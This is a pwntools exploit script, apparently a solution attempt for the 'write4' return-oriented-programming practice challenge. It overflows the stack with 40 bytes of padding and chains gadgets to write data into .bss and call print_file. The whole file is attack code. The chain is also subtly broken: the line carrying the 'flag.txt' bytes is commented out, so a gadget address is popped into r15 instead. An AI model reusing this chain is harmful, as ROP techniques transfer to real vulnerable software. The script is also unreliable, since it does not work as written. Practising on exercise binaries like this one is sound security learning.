from pwn import *

elf = ELF('./write4')
io = elf.process()

#0x0000000000601038 .bss


pause()
io.recvuntil(b"> ")
#io.sendline(b"AAAAAAAA")
pop_rdi = (0x0000000000400693) #: pop rdi ; ret

pld = b""
pld += b"A" * 40
pld += p64(0x0000000000400690) #: pop r14 ; pop r15 ; ret
pld += p64(0x0000000000601038)
#pld += p64(0x7478742e67616c66)
pld += p64(0x0000000000400628) #: mov qword ptr [r14], r15 ; ret
pld += p64(pop_rdi)
pld += p64(0x0000000000601038)
pld += p64(elf.plt['print_file'])



io.sendline(pld)

io.interactive()
